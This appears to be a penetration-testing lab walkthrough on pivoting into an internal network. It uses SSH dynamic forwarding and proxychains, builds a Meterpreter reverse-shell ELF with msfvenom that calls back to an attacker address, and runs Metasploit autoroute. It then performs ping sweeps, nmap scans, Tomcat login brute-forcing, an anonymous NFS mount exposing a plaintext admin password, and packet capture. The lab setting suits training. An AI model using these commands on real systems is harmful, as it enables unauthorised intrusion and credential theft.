## Setting Up Pivoting - SSH

In our first terminal, let's set up the SSH dynamic port forwarding command first:

```shell
3kjS@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111
```

We can confirm that the dynamic port forward is set up using `Netstat` or running an Nmap scan against our localhost address.

```shell
3kjS@htb[/htb]$ netstat -antp | grep 8081

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
tcp6       0      0 ::1:8081
```

```shell
3kjS@htb[/htb]$ grep socks4 /etc/proxychains.conf 

#       socks4  192.168.1.49    1080
#       proxy types: http, socks4, socks5
socks4  127.0.0.1 8081
```

```shell
3kjS@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```
## Setting Up Pivoting - Metasploit

First, generate a reverse shell in Elf format using `msfvenom`.

```shell
3kjS@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
```

Next, transfer the host to the target. Since we have SSH, we can upload it to the target using SCP.

```shell
3kjS@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```

Now, we'll set up the Metasploit `exploit/multi/handler`.

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443
```

```shell
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf
```

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```

Next, we can set up routing using the `post/multi/manage/autoroute` module.

```shell
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
subnet => 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
```
## Host Discovery - 172.16.8.0/23 Subnet - Metasploit

```shell
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+]     172.16.8.3 host found
[+]     172.16.8.20 host found
[+]     172.16.8.50 host found
[+]     172.16.8.120 host found
```
## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

```shell
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```
## Host Enumeration

```shell
root@dmz01:/tmp# ./nmap --open -iL live_hosts

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)

Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
```

From the Nmap output, we can gather the following:

- 172.16.8.3 is a Domain Controller because we see open ports such as Kerberos and LDAP. We can likely leave this to the side for now as its unlikely to be directly exploitable (though we can come back to that)
- 172.16.8.20 is a Windows host, and the ports `80/HTTP` and `2049/NFS` are particularly interesting
- 172.16.8.50 is a Windows host as well, and port `8080` sticks out as non-standard and interesting
## Active Directory Quick Hits - SMB NULL SESSION

```shell
3kjS@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3
```
## 172.16.8.50 - Tomcat

```shell
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50
rhosts => 172.16.8.50
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```
## Enumerating 172.16.8.20 - DotNetNuke (DNN)

![](Internal%20Information%20Gathering-20260902-205254.png)

Browsing to the page confirms our suspicions.

![](Internal%20Information%20Gathering-20260902-205259.png)

Browsing to `http://172.16.8.20/Login?returnurl=%2fadmin` shows us the admin login page. There is also a page to register a user. We attempt to register an account but receive the message:

`An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site.`

We can use [showmount](https://linux.die.net/man/8/showmount) to list exports, which we may be able to mount and browse similar to any other file share. We find one export, `DEV01`, that is accessible to everyone (anonymous access). Let's see what it holds.

```shell
3kjS@htb[/htb]$ proxychains showmount -e 172.16.8.20
```

We can't mount the NFS share through Proxychains, but luckily we have root access to the dmz01 host to try. We see a few files related to DNN and a `DNN` subdirectory.

```shell
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml
```

```shell
root@dmz01:/tmp/DEV01# cd DNN 
root@dmz01:/tmp/DEV01/DNN# ls
```
![](Screenshot%202026-09-02%20at%2020.54.45.png)

Checking the contents of the web.config file, we find what appears to be the administrator password for the DNN instance.

```shell
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
    <value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

```shell
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes ^C2027 packets captured 2033 packets received by filter 0 packets dropped by kernel
```
